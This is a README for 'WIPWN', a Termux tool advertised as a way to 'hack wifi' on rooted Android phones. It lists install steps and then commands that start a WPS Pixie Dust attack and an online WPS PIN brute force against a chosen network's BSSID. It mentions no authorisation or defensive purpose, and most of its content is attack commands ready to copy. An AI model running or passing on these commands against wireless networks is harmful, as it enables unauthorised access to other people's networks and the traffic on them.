# WIPWN

![Logo](images/image.png)

### Hack wifi using Termux (rooted)
    
- [Requirements]
  - [Python](https://www.python.org)
  - [Pixiewps](https://www.kali.org/tools/pixiewps/)
  - [Wpa-supplicant](https://wiki.archlinux.org/title/wpa_supplicant)
 
### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python wpa-supplicant pixiewps iw -y
git clone https://github.com/anbuinfosec/wipwn
cd wipwn
chmod +x main.py
```

#### Help : ```sudo python main --help```
#### Example : ```sudo python main.py -i wlan0 -K```

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- ```sudo python main.py -i wlan0 -K```
- ```bash wipwn.sh```
- - Start Pixie Dust attack on a specified BSSID:
`sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**

---

### ❤️ Thanks for stars and forks
[![Stargazers repo roster for @anbuinfosec/wipwn](https://reporoster.com/stars/dark/anbuinfosec/wipwn)](https://github.com/anbuinfosec/wipwn/stargazers)
[![Forkers repo roster for @anbuinfosec/wipwn](https://reporoster.com/forks/dark/anbuinfosec/wipwn)](https://github.com/anbuinfosec/wipwn/network/members)
